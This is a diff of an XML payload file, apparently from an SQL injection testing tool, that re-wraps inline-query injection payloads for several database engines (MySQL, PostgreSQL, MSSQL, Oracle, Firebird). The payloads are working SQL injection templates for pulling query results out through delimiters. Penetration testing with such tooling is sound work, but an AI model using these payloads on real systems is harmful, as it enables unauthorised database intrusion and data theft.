@@ -15,7 +15,8 @@
             <payload>(SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
             <payload>(SELECT CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
             -->
-            <payload>(SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
+            <payload>(SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -34,7 +35,9 @@
         <where>3</where>
         <vector>(SELECT '[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]')</vector>
         <request>
-            <payload>(SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]')</payload>
+            <payload>(SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0
+                END))::text||'[DELIMITER_STOP]')
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -53,7 +56,9 @@
         <where>3</where>
         <vector>(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')</vector>
         <request>
-            <payload>(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')</payload>
+            <payload>(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0'
+                END))+'[DELIMITER_STOP]')
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -74,7 +79,9 @@
         <where>3</where>
         <vector>(SELECT ('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]') FROM DUAL)</vector>
         <request>
-            <payload>(SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]' FROM DUAL)</payload>
+            <payload>(SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM
+                DUAL)||'[DELIMITER_STOP]' FROM DUAL)
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -93,7 +100,9 @@
         <where>3</where>
         <vector>SELECT '[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'</vector>
         <request>
-            <payload>SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))||'[DELIMITER_STOP]'</payload>
+            <payload>SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0
+                END))||'[DELIMITER_STOP]'
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -112,7 +121,9 @@
         <where>3</where>
         <vector>SELECT '[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]' FROM RDB$DATABASE</vector>
         <request>
-            <payload>SELECT '[DELIMITER_START]'||(CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END)||'[DELIMITER_STOP]' FROM RDB$DATABASE</payload>
+            <payload>SELECT '[DELIMITER_START]'||(CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END)||'[DELIMITER_STOP]'
+                FROM RDB$DATABASE
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
